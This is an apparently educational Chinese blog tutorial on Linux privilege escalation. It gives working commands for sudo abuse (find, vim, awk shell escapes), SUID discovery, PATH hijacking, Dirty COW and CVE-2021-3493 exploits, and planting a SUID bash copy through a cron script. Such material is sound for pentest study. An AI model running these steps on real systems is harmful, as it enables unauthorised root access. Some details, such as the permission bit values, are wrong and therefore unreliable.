---
author: YOUZAI
title: 权限提升
date: 2023/06/20
categories:
 - Linux
tags:
 - 内网安全
---

## 系统权限

> root [uid=0] > 系统用户 [1>=uid>=499] > 普通用户 [uid>=500]

### 用户权限

在 Linux 中，有两种用户，一种是超级用户（==root==），一种是普通用户。超级用户可以在系统中做任何事情，不受限制，而普通用户往往只有某些特定的权限。超级用户的命令提示符是 `#`，普通用户是 `$`。

切换用户：

```sh
su user # 切换一般用户。
su root # 切换 root 用户，root 可以省略。
```

### 文件权限

Linux 中文件的访问者有三种：

* 拥有者 owner
* 所属组 group
* 其他 other

![](/images/微信图片_20220827003617.png)

其中前几位分别表示了文件的类型和访问权限。

```sh
总用量 44
drwx------ 2 youzai     youzai     4096  8月 27 00:33 test1
drwx------ 3 root       root       4096  8月 27 00:33 test2
drwx------ 3 root       root       4096  8月 27 00:33 systemd1
drwx------ 3 root       root       4096  8月 27 00:33 systemd2
drwx------ 3 root       root       4096  8月 27 00:33 systemd3
drwx------ 3 root       root       4096  8月 27 00:33 systemd4
drwx------ 3 root       root       4096  8月 27 00:33 systemd5
drwx------ 2 youzai     youzai     4096  8月 27 00:33 admintest
drwx------ 2 Debian-gdm Debian-gdm 4096  8月 27 00:33 cc
drwxrwxrwt 2 root       root       4096  8月 27 00:33 aa
drwx------ 2 root       root       4096  8月 27 00:33 test3
```

* 第一位表示文件的类型
  * `d` -> 文件夹
  * `-` -> 普通文件
  * `l` -> 软链接（类似 Windows 的快捷方式）
  * `b` -> 块设备文件（例如硬盘、光驱等）
  * `p` -> 管道文件
  * `c` -> 字符设备文件（例如屏幕等串口设备）
  * `s` -> 套接口文件
* 后九位中，前三位表示==此文件的拥有者==的权限，中间三位表示==所属的组==的权限，后三位表示==其他人==的权限
  * `r` -> 文件的读权限，二进制为 **1**
  * `w` -> 文件的写权限，二进制为 **2**
  * `x` -> 文件执行权限，二进制为 **4**

修改文件权限：

```sh
chmod [参数] 权限 文件名
```

用户符号：

* `u` -> 拥有者
* `g` -> 拥有者同组用
* `o` -> 其它用户
* `a` -> 所有用户

## 信息收集

### 版本信息

* 获取当前操作系统版本信息

```sh
cat /proc/version
uname -a #查看所有信息。
uname --help #查看帮助。
uname -v #查看内核版本。
uname -r #查看内核发行号。
```

* 获取当前操作系统的发行版信息

```sh
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release # Debian。
cat /etc/redhat-release # Redhat。
```

### 漏洞信息

* [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
* [https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

将脚本文件上传到目标后，执行脚本：

```sh
bash ./linux-exploit-suggester.sh
```

![](/images/微信图片_20220825162853.png)

::: warning 注意

出现提示："bash: ./test: cannot execute binary file"

:::

* 所执行的文件没有权限，需要添加权限

```sh
chmod 777 test
```

* 32位和64位系统所需软件类型不同


## SUDO 提权

### 原理

sudo 是 Linux 系统管理指令，是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具，如 halt，reboot，su 等等。这样不仅减少了 root 用户的登录和管理时间，同样也提高了安全性。sudo 不是对 shell 的一个代替，它是面向每个命令的。sudo 可以使一般用户不需要知道超级用户的密码即可获得权限。

### 复现

首先需要了解 sudoers 文件，这个文件对用户的 sudo 权限进行了说明和规范，文件主要由三部分组成：

* sudoers 的默认配置（default），主要设置sudo的一些缺省值。
* alias（别名），主要有 Host_Alias | Runas_Alias | User_Alias | Cmnd_Alias。
* 安全策略（规则定义）。

```ini
root ALL=(ALL) ALL
```

::: info 说明

root 用户可以从 ALL 终端作为 ALL（任意）用户执行，并运行 ALL（任意）命令。

:::

```ini
touhid ALL= /sbin/poweroff
```

::: info 说明

touchid 用户可以从任何终端使用 touhid 的用户密码关闭命令电源。

:::

```ini
touhid ALL = (root) NOPASSWD: /usr/bin/find
```

::: info 说明

用户 touchid 可以从任何终端运行，以 root 用户身份运行命令 find 而无需密码。

:::

在 Linux 中，sudo 命令常用的参数：

* `-V` -> 显示版本编号。
* `-h` -> 会显示版本编号及指令的使用方式说明。
* `-l` -> 显示出自己（执行 sudo 的使用者）的权限。

想要利用 sudo 用户，首先需要查看允许的命令：

```sh
sudo -l
```

![](/images/微信图片_20220828145348.png)

当发现可以用 sudo 调用的命令时，如 find 命令，可以用以下方式调用，达到提权目的：

```sh
sudo find /etc/passwd -exec /bin/sh \;
sudo find /bin -name nano -exec /bin/sh \;
```

* 使用 vim 命令

```sh
sudo vim -c'!sh'
```

* 使用 man 命令

```sh
sudo man man
```

* 使用 awk 命令

```sh
sudo awk'BEGIN {system（"/bin/sh"）}'
```

* 使用 less / more 命令

```sh
sudo less /etc/hosts
sudo more /etc/hosts
```

::: tip 执行完命令后按下<kbd>!</kbd>，之后按下<kbd>Enter</kbd>。
:::

![](/images/微信图片_20220828151425.png)

## SUID 提权

### 原理

程序在运行的时候被赋予了 root 权限，是程序在运行过程中受到了 suid root 权限的执行过程导致。`chmod u+s` 赋予了 suid， `u-s`删除 suid。

### 复现

Linux 提权一般上传至`/temp/`目录下，因为关机就会清空，且该目录一般具有读写权限。使用探针探测是否有 SUID，利用特定 SUID 进行提权。

可以用于产生shell的程序：

* Nmap
* Vim
* find
* Bash
* More
* Less
* Nano
* cp

以下命令可以发现系统上运行的所有 SUID 可执行文件：

```sh
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

![](/images/微信图片_20220824231612.png)

以 root 执行命令：

```sh
touch test
find test -exec id \;
```

![](/images/微信图片_20220824231831.png)

## 脏牛漏洞提权

### 原理

脏牛（Dirty Cow）是 Linux 内核的一个提权漏洞，攻击者可以利用这个漏洞获取 root 权限。之所以叫 Dirty Cow，因为这个漏洞利用了 Linux 的 copy-on-write 机制。脏牛的 CVE 编号是 CVE-2016-5195。

::: info 影响版本

以下是主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞。

:::

```sh
Centos7 /RHEL7    3.10.0-327.36.3.el7
Cetnos6/RHEL6     2.6.32-642.6.2.el6
Ubuntu 16.10         4.8.0-26.28
Ubuntu 16.04         4.4.0-45.66
Ubuntu 14.04         3.13.0-100.147
Debian 8                3.16.36-1+deb8u2
Debian 7                3.2.82-1
```

### 复现

> 在漏洞的主机中上传漏洞检测脚本后，如果发现存在脏牛漏洞，则下载对应的 exp，并上传至目标主机进行利用。

```sh
bash ./les.sh
```

![](/images/微信图片_20220825172112.png)

通过链接下载对应的 exp 后，上传至服务器，并将 cpp 文件编译。

```sh
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow # 执行文件，如果没有权限，则使用命令 chmod 777 dcow 添加对应的权限。
```
成功拿到 root 权限。

![](/images/微信图片_20220825172501.png)

## 环境变量提权

### 原理

> PATH 是 Linux 和类 Unix 操作系统中的环境变量，它指定存储所有可执行程序的所有 bin 和 sbin 目录。当用户在终端上运行任何命令时，它会请求 shell 在 PATH 变量的帮助下搜索可执行文件，以响应用户执行的命令。超级用户通常还具有 /sbin 和 /usr/sbin 条目，以便轻松执行系统管理命令。

查看环境变量 $PATH：

```sh
echo $PATH
```

![](/images/微信图片_20220826133831.png)

::: info 理解

在 Linux 中如果执行命令，系统会在这些路径下寻找是否存在这些命令对应的可执行文件，例如，输入 `cat` 命令后，系统会在 $PATH 的路径下去寻找该命令对应的执行文件。

:::

```sh
which `cat`
```

![](/images/微信图片_20220826134056.png)

那么我们需要做的就是将路径修改，让系统首先在我们指定的目录下寻找命令对应的可执行文件，然后以 root 的身份执行该文件，即可达到提权的目的。

### 复现

首先我们要以 root 身份创建一个文件，文件的目录假设为 /tmp，文件名为 shell.c，并将这个文件编译后输出为一个可执行的文件：

```c
#include<stdlib.h>
#include <unistd.h>
void main()
{
  setuid(0);
  system("ps");
}
```

将文件编译后输出：

```sh
gcc shell.c -o shell
chmod u+s shell # 给 shell 文件赋予 SUID 权限。
./shell # 执行该文件。
```

![](/images/微信图片_20220826135822.png)

当创建完成之后，我们发现该文件中使用了 system() 函数，该函数是继承环境变量的，因此便可以通过替换环境变量可以达到执行任意命令的效果。我们要做的就是替换 ps 所在的路径，并且修改 ps 这个命令可执行文件的内容，即自己创建一个 ps 文件。

```sh
echo "/bin/sh" > ps # ps 文件执行后将开启一个 shell。
chmod 777 ps # 给 ps 文件添加权限。
export PATH=/tmp:$PATH # 将环境变量的路径前面加上 /tmp。
```

这样，我们就完成了 ps 命令的伪造，当 ps 命令执行的时候，便会调用我们自己的命令，即以 root 执行 `/bin/sh/`。

\$PATH 变量修改前后的变化：

![](/images/微信图片_20220826140037.png)

该方法提权有几个前提：

* 需要有 root 用户创建的可执行文件。
* 该文件执行的时候是以 SUID 的权限执行。

可以使用命令查找具有这些特征的文件：

```sh
find / -perm -u=s -type f 2>/dev/null
```

![](/images/微信图片_20220826141319.png)

![](/images/微信图片_20220826141436.png)

::: tip SUID

文件中的权限 s 是让普通用户可以以 root 用户的角色运行只有 root 帐号才能运行的程序或命令。

:::

## 内核漏洞提权

### 原理

Linux kernel 一般指 Linux 内核。Linux 是一种开源电脑操作系统内核。它是一个用 C 语言写成，符合 POSIX 标准的类 Unix 操作系统。可以利用 Linux 内核中存在的漏洞达到提权的目的。

### 复现

> 在渗透测试的过程中，可以借助信息收集查看系统的版本，结合版本信息查看是否存在可以利用的提权漏洞，这里用 CVE-2021-3493 漏洞为例。

下载 Ubantu 对应版本：

[http://mirrors.aliyun.com/ubuntu-releases/16.04/](http://mirrors.aliyun.com/ubuntu-releases/16.04/)

![](/images/微信图片_20220826163226.png)

使用 VMware 安装：

![](/images/微信图片_20220826163328.png)

下载对应的 exp，编译执行：

[https://github.com/briskets/CVE-2021-3493](https://github.com/briskets/CVE-2021-3493)

```sh
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

![](/images/微信图片_20220826163619.png)

成功提升至 root 权限。

## 计划任务提权

### 原理

在 linux 系统中，执行周期的任务，可以使用 crontab。crontab 会把你指定的工作或任务，按照你设定的周期一直循环执行下去。cron 通常以 root 权限运行。如果我们可以成功修改 cron 中的任何脚本或二进制文件，那么我们可以使用 root 权限执行任意代码。

### 复现

crontab 计划任务格式：

```sh
* * * * * user command
```

* 第 1 列表示分钟 1～59，每分钟用 `*` 或者 `*/1` 表示。
* 第 2 列表示小时 1～23（0 表示 0 点）。
* 第 3 列表示日期 1～31。
* 第 4 列表示月份 1～12。
* 第 5 列表示星期 0～6（星期日用 0 或 7 表示）。
* 第 6 列表示以该用户的权限运行命令。
* 第 7 列要运行的命令。

例如，想让服务器每一分钟执行一次脚本，可以使用如下命令：

```sh
# 使用 vim /etc/crontab 编辑计划任务，加入以下任务。
*/1 * * * * root python /tmp/cleanup.py
```

这样，服务器便会每分钟执行 /tmp 目录下的 cleanup\.py 脚本。

首先需要一个 root 用户创建的可执行文件，如图中的 cleanup\.py 脚本，并且该脚本以 SUID 权限运行。

查找服务器中的脚本文件：

![](/images/微信图片_20220827000958.png)

查看计划任务：

![](/images/微信图片_20220827001425.png)

编辑脚本文件，并将提权的命令写入其中：

```python
#! /usr/bin/env python
import os
import sys
try:
  os.system('cp /bin/bash /tmp/bash; chmod +s /tmp/bash')
except:
  sys.exit()
```

::: warning 无法编辑脚本文件

若无法编辑脚本文件，那么可能是权限不足，这时候可以使用 `sudo` 命令。

:::

等待计划任务执行后，脚本执行完成，便可以使用 /tmp 目录下的 bash 进行提权操作。

```sh
/tmp/bash -p
```

::: info 参数解释

当真实和有效的用户 id 不匹配时使用 `-p`。禁用 $ENV 文件的处理和 shell 函数的导入。关闭此选项将导致有效 uid 和 gid 设置为实际 uid 和 gid。

:::

![](/images/微信图片_20220827002215.png)
